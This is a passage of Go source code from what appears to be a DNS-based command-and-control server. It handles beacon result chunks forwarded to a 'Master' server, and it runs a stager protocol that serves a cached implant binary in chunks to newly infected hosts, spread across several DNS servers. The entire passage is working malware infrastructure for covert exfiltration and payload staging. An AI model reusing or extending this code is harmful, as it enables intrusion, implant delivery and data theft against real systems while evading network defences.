		c2.mutex.RUnlock()

		if c2.debug {
			logf("[C2] Received chunk %d/%d for task %s - forwarding to Master", chunkIndex, totalChunks, taskID)
		}

		// Forward chunk to Master immediately - Master handles all assembly
		if masterClient != nil {
			c2.mutex.RLock()
			masterID, isMasterTask := c2.masterTaskIDs[taskID]
			c2.mutex.RUnlock()

			if isMasterTask {
				go masterClient.SubmitResult(masterID, beaconID, chunkIndex, totalChunks, chunkData)
			}
		}

		return "ACK", true

	case "RESULT_COMPLETE":
		// RESULT_COMPLETE|id|taskID|totalChunks|timestamp
		if len(msgParts) < 4 {
			return "", false
		}
		beaconID = msgParts[1]
		taskID := msgParts[2]
		totalChunksFromMsg, _ := strconv.Atoi(msgParts[3])

		// Clean up local tracking state (no local assembly - Master handles it)
		c2.mutex.Lock()
		expected, ok := c2.expectedResults[taskID]
		var totalChunks int
		if ok {
			totalChunks = expected.TotalChunks
			delete(c2.expectedResults, taskID)
		} else {
			totalChunks = totalChunksFromMsg
		}

		// Clean up in-progress tracking
		delete(c2.tasksInProgress, taskID)

		// Update local task status and clear beacon's current task
		if task, taskExists := c2.tasks[taskID]; taskExists {
			task.Status = "completed"
			if beacon, exists := c2.beacons[beaconID]; exists && beacon.CurrentTask == taskID {
				beacon.CurrentTask = ""
			}
		}
		c2.mutex.Unlock()

		logf("[C2] Result complete for task %s (%d chunks) - forwarding to Master", taskID, totalChunks)

		// Update local DB status (result will come from Master sync later)
		if c2.db != nil {
			go c2.db.UpdateTaskStatus(taskID, "completed")
		}

		// Forward completion to Master - Master assembles from chunks received from all DNS servers
		if masterClient != nil {
			c2.mutex.RLock()
			masterID, isMasterTask := c2.masterTaskIDs[taskID]
			c2.mutex.RUnlock()

			if isMasterTask {
				go masterClient.MarkTaskComplete(masterID, beaconID, totalChunks)
			}
		}

		return "ACK", true

	case "STG":
		// STG|IP|OS|ARCH|timestamp - Stager initialization request
		if len(msgParts) < 4 {
			return "", false
		}
		stagerIP := msgParts[1]
		osType := msgParts[2]
		arch := msgParts[3]

		logf("[Stager] Init request from %s (os=%s, arch=%s)", stagerIP, osType, arch)

		// Check local cache first - if we have chunks cached, use them
		clientBinaryID, totalChunks, hasCached := c2.db.GetCachedBinaryInfo()
		if hasCached && totalChunks > 0 {
			// Generate deterministic session ID from stagerIP + clientBinaryID
			// This ensures all DNS servers use the same session ID for the same stager
			sessionID := generateDeterministicSessionID(stagerIP, clientBinaryID)

			// Store session locally
			c2.mutex.Lock()
			c2.stagerSessions[stagerIP] = &StagerSession{
				ClientIP:       stagerIP,
				SessionID:      sessionID,
				ClientBinaryID: clientBinaryID,
				OS:             osType,
				Arch:           arch,
				TotalChunks:    totalChunks,
				DeliveredCount: 0,
				StartedAt:      time.Now(),
				LastActivity:   time.Now(),
			}
			c2.mutex.Unlock()

			logf("[Stager] Using cached binary %s (%d chunks) for session %s", clientBinaryID, totalChunks, sessionID)

			// Notify Master about stager contact (async, don't wait)
			if masterClient != nil {
				go masterClient.NotifyStagerContact(stagerIP, osType, arch, clientBinaryID, totalChunks)
			}

			return fmt.Sprintf("META|%s|%d", sessionID, totalChunks), true
		}

		// No local cache - fall back to Master
		if masterClient != nil {
			sessionInfo, err := masterClient.InitStagerSession(stagerIP, osType, arch)
			if err != nil {
				logf("[Stager] Failed to init session with Master: %v", err)
				return "", false
			}

			// Store session locally for chunk tracking
			c2.mutex.Lock()
			c2.stagerSessions[stagerIP] = &StagerSession{
				ClientIP:       stagerIP,
				SessionID:      sessionInfo.SessionID,
				OS:             osType,
				Arch:           arch,
				TotalChunks:    sessionInfo.TotalChunks,
				DeliveredCount: 0,
				StartedAt:      time.Now(),
				LastActivity:   time.Now(),
			}
			c2.mutex.Unlock()

			return fmt.Sprintf("META|%s|%d", sessionInfo.SessionID, sessionInfo.TotalChunks), true
		}

		logf("[Stager] No cached chunks and no Master connection")
		return "NO_CACHE", false

	case "CHUNK":
		// CHUNK|chunk_index|IP|session_id|timestamp - Request for a specific chunk
		if len(msgParts) < 4 {
			return "", false
		}
		chunkIndex, _ := strconv.Atoi(msgParts[1])
		stagerIP := msgParts[2]
		sessionID := msgParts[3]

		if c2.debug {
			logf("[Stager] Chunk request: index=%d, session=%s, ip=%s", chunkIndex, sessionID, stagerIP)
		}

		// For stager sessions (stg_* prefix), serve from cache - no Master fallback needed
		// This supports Shadow Mesh where different DNS servers handle different requests
		// Each DNS server has the full binary cached, so we can serve any chunk locally
		if strings.HasPrefix(sessionID, "stg_") {
			clientBinaryID, totalChunks, hasCached := c2.db.GetCachedBinaryInfo()
			if hasCached && totalChunks > 0 {
				chunk, found := c2.db.GetCachedStagerChunk(clientBinaryID, chunkIndex)
				if found {
					// Create/update session for tracking
					c2.mutex.Lock()
					session, exists := c2.stagerSessions[stagerIP]
					if !exists || session.SessionID != sessionID {
						session = &StagerSession{
							ClientIP:       stagerIP,
							SessionID:      sessionID,
							ClientBinaryID: clientBinaryID,
							OS:             "unknown",
							Arch:           "unknown",
							TotalChunks:    totalChunks,
							DeliveredCount: 0,
							StartedAt:      time.Now(),
							LastActivity:   time.Now(),
						}
						c2.stagerSessions[stagerIP] = session
					}
					session.LastActivity = time.Now()
					session.DeliveredCount = chunkIndex + 1
					session.LastChunkDelivered = chunkIndex
					session.LastChunk = &chunkIndex // Update pointer for progress updater
					c2.mutex.Unlock()

					c2.logStagerProgress(session, chunkIndex, clientIP)

					// Report progress to Master (async) - report first, every 10th, and last chunk
					// Reduced from 100 to 10 for better progress visibility with slow timing profiles
					if masterClient != nil && (chunkIndex == 0 || chunkIndex%10 == 0 || chunkIndex == totalChunks-1) {
						go masterClient.ReportStagerProgress(sessionID, chunkIndex, stagerIP)
					}

					return fmt.Sprintf("CHUNK|%s", chunk), true
				}
				// Chunk not found but we have cache - this shouldn't happen
				logf("[Stager] ERROR: Chunk %d not found in cache for binary %s", chunkIndex, clientBinaryID)
			}
			// No cache available - stager cache not synced yet
			logf("[Stager] No cached binary available for stg_* session %s (chunk %d requested)", sessionID, chunkIndex)
			return "RETRY", false
		}

		// Get session info for non-stg sessions (legacy/fallback)
		c2.mutex.RLock()
		session, exists := c2.stagerSessions[stagerIP]
		c2.mutex.RUnlock()

		if !exists || session.SessionID != sessionID {
			logf("[Stager] Unknown session %s from %s", sessionID, stagerIP)
			return "", false
		}

		// Update activity
		c2.mutex.Lock()
		session.LastActivity = time.Now()
		c2.mutex.Unlock()

		// Try local cache first if we have a client binary ID
		if session.ClientBinaryID != "" {
			chunk, found := c2.db.GetCachedStagerChunk(session.ClientBinaryID, chunkIndex)
			if found {
				// Update progress
				c2.mutex.Lock()
				session.DeliveredCount = chunkIndex + 1
				session.LastChunkDelivered = chunkIndex
				session.LastChunk = &chunkIndex // Update pointer for progress updater
				c2.mutex.Unlock()

				c2.logStagerProgress(session, chunkIndex, clientIP)

				// Report progress to Master (async) - report first, every 10th, and last chunk
				if masterClient != nil && (chunkIndex == 0 || chunkIndex%10 == 0 || chunkIndex == session.TotalChunks-1) {
					go masterClient.ReportStagerProgress(sessionID, chunkIndex, stagerIP)
				}

				return fmt.Sprintf("CHUNK|%s", chunk), true
			}
		}

		// Fall back to Master for chunk
		if masterClient != nil {
			chunkResp, err := masterClient.GetStagerChunk(sessionID, chunkIndex, stagerIP)
			if err != nil {
				logf("[Stager] Failed to get chunk %d: %v", chunkIndex, err)
				return "", false
			}

			// Update progress
			c2.mutex.Lock()
			session.DeliveredCount = chunkIndex + 1
			session.LastChunkDelivered = chunkIndex
			session.LastChunk = &chunkIndex // Update pointer for progress updater
			totalChunks := session.TotalChunks
			c2.mutex.Unlock()

			c2.logStagerProgress(session, chunkIndex, clientIP)

			// Report progress to Master (async) - report first, every 10th, and last chunk
			if chunkIndex == 0 || chunkIndex%10 == 0 || chunkIndex == totalChunks-1 {
				go masterClient.ReportStagerProgress(sessionID, chunkIndex, stagerIP)
			}

			return fmt.Sprintf("CHUNK|%s", chunkResp.ChunkData), true
		}

		logf("[Stager] No cached chunk and no Master connection")
		return "", false

	default:
		if c2.debug {
			logf("[C2] Unknown message type: %s", msgType)
		}
		return "", false
	}
}
